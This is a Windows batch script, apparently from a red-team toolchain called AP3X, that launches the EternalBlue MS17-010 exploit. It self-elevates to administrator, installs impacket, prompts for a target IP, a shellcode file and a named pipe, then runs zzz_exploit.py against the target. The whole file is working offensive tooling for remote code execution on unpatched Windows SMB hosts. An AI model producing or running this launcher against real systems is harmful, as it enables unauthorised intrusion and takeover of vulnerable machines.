@echo off
:: ETERNALBLUE MS17-010 EXPLOIT LAUNCHER - AP3X TOOLCHAIN
setlocal EnableDelayedExpansion
title EternalBlue Exploit Launcher [MS17-010] - AP3X Red/Purple Team Ops
color 1f

:: ===== Admin Check =====
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] Admin privileges required. Relaunching as admin...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ===== System Info =====
echo =======================================================
echo [*] EternalBlue MS17-010 Python Launcher
echo [*] Host: %COMPUTERNAME%  User: %USERNAME%
for /f "tokens=2 delims==" %%i in ('"wmic os get Caption /value"') do set OSName=%%i
echo [*] OS Detected: !OSName!
echo [*] Time: %date% %time%
echo =======================================================

:: ===== Python Check =====
where python >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] Python is not installed or not in PATH.
    pause & exit /b
)

:: ===== Install Required Python Modules =====
echo [*] Ensuring required Python packages are installed...
python -m pip install --upgrade pip >nul 2>&1
python -m pip install impacket >nul 2>&1

:: ===== Prompt for Target =====
set /p targetIP="Enter target IP (vulnerable to MS17-010): "
if "%targetIP%"=="" (
    echo [!] No IP provided.
    pause & exit /b
)

:: ===== Prompt for Payload Shellcode =====
set /p shellcodeFile="Enter path to shellcode file (e.g., sc_all.bin): "
if not exist "%shellcodeFile%" (
    echo [!] File not found: %shellcodeFile%
    pause & exit /b
)

:: ===== Optional Named Pipe =====
set /p pipeName="Enter pipe name [default = BROWSER]: "
if "%pipeName%"=="" set pipeName=BROWSER

:: ===== Launch Exploit =====
echo [+] Executing EternalBlue MS17-010 PoC against: %targetIP%
python zzz_exploit.py %targetIP% %pipeName% "%shellcodeFile%"

:: ===== Cleanup =====
echo =======================================================
echo [*] Exploit attempt completed.
pause
exit /b
